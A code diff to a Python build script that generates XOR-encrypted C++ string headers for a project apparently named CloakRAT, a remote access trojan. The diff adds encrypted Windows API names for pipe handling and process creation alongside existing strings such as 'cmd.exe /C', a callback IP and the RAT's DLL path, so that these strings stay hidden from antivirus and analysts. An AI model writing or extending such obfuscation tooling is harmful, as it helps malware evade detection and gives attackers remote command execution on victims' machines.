@@ -1,8 +1,9 @@
 import secrets
+import os
 
 HEADER_NAME = 'encrypted_strings_autogen.h'
 SOURCE_NAME = 'encrypted_strings_autogen.cpp'
-DIR = 'Shared'
+DIR = os.path.dirname(os.path.realpath(__file__)) + '\\Shared'
 KEY_ENTROPY = 16 # bytes
 HEADER_XOR_KEY_VARIABLE_NAME = 'BUILD_TIME_KEY'
 HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'
@@ -10,7 +11,7 @@ HEADER_XOR_CIPHER_VARIABLE_NAME = 'BUILD_TIME_CIPHER_BYTE'
 
 # Add or modify strings here.
 strings_to_encrypt = {
-    # general strings
+    # CloakRAT general strings
     'str_ip': '127.0.0.1',
     'str_cmd': 'cmd.exe /C',
     'str_dllPath': 'C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll',
@@ -34,6 +35,13 @@ strings_to_encrypt = {
     'str_CreateToolhelp32Snapshot': 'CreateToolhelp32Snapshot',
     'str_Process32First': 'Process32First',
     'str_Process32Next': 'Process32Next',
+    'str_CreatePipe': 'CreatePipe',
+    'str_SetHandleInformation': 'SetHandleInformation',
+    'str_ReadFile': 'ReadFile',
+    'str_CreatePipe': 'CreatePipe',
+    'str_FormatMessageA': 'FormatMessageA',
+    'str_LocalFree': 'LocalFree',
+    'str_CreateProcessA': 'CreateProcessA',
     
     
     # DLLs
@@ -71,7 +79,7 @@ def to_extern_decl(variable_name: str) -> str:
     return f"extern unsigned char {variable_name}[];"
     
 
-def main():
+def main():    
     key = gen_key()
 
     rand_op1 = get_random_op()
